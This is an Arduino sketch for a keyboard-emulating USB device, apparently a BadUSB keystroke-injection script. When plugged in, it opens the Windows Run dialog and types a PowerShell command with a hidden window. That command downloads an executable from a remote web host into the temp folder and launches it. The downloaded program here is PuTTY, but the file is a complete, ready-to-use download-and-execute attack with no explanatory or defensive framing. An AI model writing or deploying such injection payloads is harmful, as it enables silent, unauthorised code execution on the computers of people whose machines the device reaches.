#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream

  Keyboard.begin();

  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');

  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell -windowstyle hidden \"$a = $(get-item hkcu:\\Environment).GetValue('tmp'); (new-object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe',(\\\"{0}\\putty.exe\\\" -f $a)); Start-Process (\\\"{0}\\putty.exe\\\" -f $a)\"");

  typeKey(KEY_RETURN);

  delay(400);
  
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
